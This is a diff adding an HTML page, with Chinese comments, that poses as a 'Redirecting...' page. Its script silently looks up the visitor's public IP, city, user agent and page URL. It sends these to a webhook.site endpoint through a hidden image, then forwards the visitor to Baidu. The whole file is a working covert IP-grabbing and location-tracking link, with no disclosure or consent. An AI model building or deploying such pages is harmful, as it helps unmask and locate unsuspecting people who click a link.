@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>跳转中...</title>
+</head>
+<body>
+    <script>
+        // 你的 Webhook 地址
+        const WEBHOOK_URL = "https://webhook.site/b1a566cd-33ae-49ef-bb54-b68c5a75e5cd";
+
+        // 获取真实公网 IP 和城市
+        async function getRealIP() {
+            try {
+                // 1. 获取真实公网 IP
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const ip = ipData.ip;
+
+                // 2. 根据 IP 获取城市信息
+                const cityRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                const cityData = await cityRes.json();
+                const city = cityData.city || '未知';
+
+                return { ip, city };
+            } catch (e) {
+                console.error("获取IP失败:", e);
+                return { ip: '未知', city: '未知' };
+            }
+        }
+
+        // 主逻辑
+        (async () => {
+            const { ip, city } = await getRealIP();
+            const visitData = {
+                ip: ip,
+                city: city,
+                time: new Date().toLocaleString('zh-CN'),
+                url: location.href,
+                ua: navigator.userAgent
+            };
+
+            // 提交到 Webhook
+            const img = new Image();
+            const params = new URLSearchParams(visitData).toString();
+            img.src = `${WEBHOOK_URL}?${params}`;
+            img.style.display = 'none';
+            document.body.appendChild(img);
+
+            // 延迟 1 秒后跳转到百度
+            setTimeout(() => {
+                window.location.href = "https://www.baidu.com";
+            }, 1000);
+        })();
+    </script>
+</body>
+</html>
